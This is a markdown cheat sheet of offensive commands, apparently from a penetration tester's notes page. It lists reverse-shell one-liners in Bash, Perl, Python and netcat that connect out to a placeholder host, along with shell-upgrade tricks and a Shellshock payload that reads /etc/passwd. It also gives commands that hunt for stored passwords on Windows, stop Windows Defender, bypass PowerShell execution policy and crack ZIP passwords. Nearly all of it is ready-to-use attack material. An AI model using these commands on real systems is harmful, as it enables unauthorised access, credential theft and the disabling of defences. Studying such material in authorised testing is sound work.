---
layout: default
---

# Shells | BASH | USEFUL COMMANDS |

## Bash

``` bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

## Perl
``` bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## Python
``` bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## Netcat
``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

## More reverse shell
``` bash
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

# Interactive shell

## Python
``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Bash
``` bash
echo os.system('/bin/bash')
```
## Sh
``` bash
/bin/bash -i
```
## Perl
``` bash
perl -e 'exec "/bin/bash"'
```
## Ruby
``` bash
exec "/bin/bash"
```
## Lua
``` bash
os.execute('/bin/bash')
```
## Adjust Interactive shell
``` bash
stty size # Find your terminal size -> 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235
```
# SHELLSHOCK
``` bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
```
# USEFUL LINUX COMMANDS
## Find a file
``` bash
locate <FILE>
find / -name "<FILE>"
```
## Active connection
``` bash
netstat -lntp
```
## List all SUID files
``` bash
find / -perm -4000 2>/dev/null
```
## Determine the current version of Linux
``` bash
 cat /etc/issue
```
## Determine more information about the environment
``` bash
uname -a
```
## List processes running
``` bash
ps -faux
```
## List the allowed (and forbidden) commands for the invoking use
``` bash
sudo -l
```
# USEFUL WINDOWS COMMANDS
``` bash
net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
# Disable windows defender
``` bash
sc stop WinDefend
```
# Bypass restriction
``` bash
powershell -nop -ep bypass
```
# List hidden files
``` bash
dir /a
```
# Find a file
``` bash
dir /b/s "<FILE>"
```
ZIP
``` bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
```
``` bash
zip2john file.zip > zip.john
john --wordlist=<PASSWORDS_LIST> zip.john
```